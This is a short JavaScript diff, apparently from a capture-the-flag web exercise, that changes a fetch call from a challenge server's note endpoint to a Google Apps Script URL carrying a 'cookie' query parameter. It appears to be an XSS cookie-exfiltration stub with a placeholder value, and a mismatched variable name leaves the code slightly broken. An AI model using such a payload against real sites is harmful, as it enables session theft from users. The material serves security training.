@@ -15,9 +15,9 @@ formData.append('submit', 'save');
 //.then(res=>{
 //
 //});
-fetch("http://offsec-chalbroker.osiris.cyber.nyu.edu:12345/note/new?title=test&content=test&submit=save", {
+fetch("https://script.google.com/macros/s/AKfycbw810ejtzxD6RkRRiwH1UUp3QCZ-t71T6Gw0uPm4lD8JepQH1A/exec?action=get&cookie=Iamworking", {
     method: "POST",
-    credentials: "same-origin",
+    credentials: "same-origin"
 }).then(res => {
     alert(response.json);
 });
